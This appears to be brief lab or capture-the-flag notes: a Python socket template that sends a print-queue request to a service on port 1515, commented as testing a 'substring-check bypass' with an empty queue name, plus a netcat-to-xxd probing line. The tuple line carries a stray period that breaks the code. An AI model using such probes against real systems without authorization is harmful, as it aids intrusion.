

## Python template for creating a socket connection

```python
import socket

target = ("10.129.248.117", 1515). # IP, port
queue = b""          # empty = the substring-check bypass; or try b"default", etc.

s = socket.socket()
s.connect(target)
s.send(b"\x02" + queue + b"\n")

resp = s.recv(1024)
print("server said:", repr(resp))   # b'\x01' = rejected; b'' or nothing = accepted
```


## Piping in terminal

```bash
# xxd
nc <ip> 1515 | xxd

```